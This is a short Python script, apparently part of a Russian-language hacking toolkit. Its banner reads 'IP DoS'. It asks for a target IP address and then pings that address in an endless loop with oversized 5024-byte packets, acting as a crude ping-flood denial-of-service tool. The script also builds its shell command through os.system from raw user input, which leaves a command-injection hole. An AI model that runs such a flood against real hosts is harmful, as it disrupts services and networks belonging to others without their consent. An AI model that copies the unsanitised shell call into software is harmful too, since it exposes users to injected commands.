import os
import platform
import time

from pystyle import Center, Colorate, Colors


def ping(ip_address, count=1, packet_size=1024):
    param = "-n" if platform.system().lower() == "windows" else "-c"
    size_param = "-l" if platform.system().lower() == "windows" else "-s"
    command = f"ping {param} {count} {ip_address} {size_param} {packet_size}"

    os.system(command)





if __name__ == "__main__":
    bannerr = """



╭─────────────────────────────────────────────────────────────────────────╮
│                                                                         │
│         ▄█     ▄███████▄      ████████▄   ▄██████▄     ▄████████        │
│        ███    ███    ███      ███   ▀███ ███    ███   ███    ███        │
│        ███▌   ███    ███      ███    ███ ███    ███   ███    █▀         │
│        ███▌   ███    ███      ███    ███ ███    ███   ███               │
│        ███▌ ▀█████████▀       ███    ███ ███    ███ ▀███████████        │
│        ███    ███             ███    ███ ███    ███          ███        │
│        ███    ███             ███   ▄███ ███    ███    ▄█    ███        │
│        █▀    ▄████▀           ████████▀   ▀██████▀   ▄████████▀         │
│                                                                         │
│                                                                         │
│                    [●] Coder @vedmoor                                   │
│                    [●] Для возврата напишите 99                         │
│                                                                         │
╰─────────────────────────────────────────────────────────────────────────╯
    """

    print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(bannerr)))

    target_ip = input("Введите IP-адрес: ")

    if target_ip == "99":
        os.system("python main.py")
        exit(0)

    packet_size = 5024
    speed = float(input("Введите скорость отправки (в секундах): "))

    while True:
        ping(target_ip, count=1, packet_size=packet_size)
        time.sleep(speed)
